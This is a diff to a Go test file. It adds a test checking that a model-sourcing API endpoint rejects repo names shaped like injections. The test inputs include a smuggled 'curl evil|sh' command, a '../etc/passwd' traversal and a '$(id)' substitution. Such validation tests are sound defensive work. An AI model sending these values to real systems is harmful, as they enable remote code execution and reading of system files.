@@ -35,3 +35,14 @@ func TestSmithSourcingEvaluate_Unwired(t *testing.T) {
 		t.Errorf("evaluate unwired = %d, want 503", w.Code)
 	}
 }
+
+// A repo that is not a plain owner/name must be refused before smith (and its shell-command runbook) ever sees it.
+func TestSmithSourcingEvaluateRejectsInjectionShapedRepo(t *testing.T) {
+	for _, repo := range []string{"foo;curl evil|sh", "a/b?x=1", "../etc/passwd", "a/$(id)", "a b/c"} {
+		s, _, _ := serverWithSmith(t, authz.Identity{Name: "operator", Role: authz.RoleAdmin})
+		w := do(t, s, authedRequest("POST", "/api/v1/smith/sourcing/evaluate", strings.NewReader(`{"hf_repo":"`+repo+`"}`)))
+		if w.Code != 422 || !strings.Contains(w.Body.String(), "invalid_value") {
+			t.Errorf("repo %q = %d, want 422 invalid_value: %s", repo, w.Code, w.Body.String())
+		}
+	}
+}
